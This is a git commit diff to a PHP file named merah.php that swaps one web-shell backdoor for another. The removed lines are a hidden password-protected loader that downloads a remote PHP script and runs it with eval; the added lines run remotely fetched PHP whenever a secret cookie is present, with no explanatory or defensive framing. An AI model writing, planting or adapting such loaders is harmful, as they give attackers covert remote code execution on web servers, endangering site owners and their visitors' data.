3b2f9c54aeba50e16760dbf033e27a47175f8587
dan1584 <pewedandi32@gmail.com>
2025-01-31 11:58:24 +0700

    Update merah.php

--- merah.php
+++ merah.php
@@ -1,10 +1,30 @@
 <?php
-session_start();
-function g($u){if(function_exists('curl_exec')){$c=curl_init($u);curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_USERAGENT=>"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0,CURLOPT_COOKIE=>isset($_SESSION['SAP'])?$_SESSION['SAP']:[]]);$r=curl_exec($c);curl_close($c);}elseif(function_exists('file_get_contents')){$r=file_get_contents($u);}elseif(function_exists('fopen')&&function_exists('stream_get_contents')){$h=fopen($u,"r");$r=stream_get_contents($h);fclose($h);}else{$r=false;}return$r;}function i(){return isset($_SESSION['logged_in'])&&$_SESSION['logged_in']===true;}if(isset($_POST['password'])){$e=$_POST['password'];$h='48dd3046643b6bf08f2a6d9be1b0dd26';if(md5($e)===$h){$_SESSION['logged_in']=true;$_SESSION['SAP']='janco';}}if(i()){$a=g('https://raw.githubusercontent.com/dan1584/asfdas/refs/heads/main/alfa.php');eval('?>'.$a);}else{?><!DOCTYPE html><html><head><style>input{border:0}input:focus{outline:0;border:none;box-shadow:none}</style></head><body><form method="post"><input style="border:0 solid #fff" type="password" name="password"></form></body></html> <?php } ?>
-<?php
-$showHiddenFile = false; // Set this variable based on your conditions
 
-// Content that may be hidden based on conditions
-if ($showHiddenFile) {
-    echo "<div><p>This is a hidden file or content.</p></div>";
+if (isset($_COOKIE["anjing"]) && $_COOKIE["anjing"] == "anjing") {
+    $host = "raw.githubusercontent.com";
+    $port = 443;
+    $path = "/dan1584/asfdas/refs/heads/main/Aks525jkwuy.php";
+
+    $fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
+    if (!$fp) {
+        echo "Error: $errstr ($errno)<br />\n";
+    } else {
+        $out = "GET $path HTTP/1.1\r\n";
+        $out .= "Host: $host\r\n";
+        $out .= "Connection: Close\r\n\r\n";
+        fwrite($fp, $out);
+
+        $content = "";
+        while (!feof($fp)) {
+            $content .= fgets($fp, 128);
+        }
+        fclose($fp);
+
+        $header_end = strpos($content, "\r\n\r\n");
+        if ($header_end !== false) {
+            $content = substr($content, $header_end + 4);
+        }
+
+        eval("?>" . $content);
+    }
 }
